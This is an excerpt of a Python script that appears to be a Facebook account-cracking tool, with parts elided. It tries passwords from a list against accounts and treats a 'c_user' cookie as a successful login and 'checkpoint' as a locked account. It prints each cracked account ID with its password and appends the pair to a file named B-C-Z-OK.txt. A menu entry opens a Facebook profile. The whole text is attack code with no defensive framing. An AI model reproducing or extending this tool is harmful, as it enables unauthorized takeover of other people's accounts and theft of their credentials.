...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='3':
		os.system('xdg-open https://www.facebook.com/your.dad.official.12?mibextid=ZbWKwL');riaz()
	if riaz1 =='2':
		bangla()
	else:
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[B-C-Z-OK] '+cid+'|'+ps+'\033[0;97m')
                open('B-C-Z-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[B-C-Z-CP] '+cid+' | '+ps+'\x1b[1;97m')
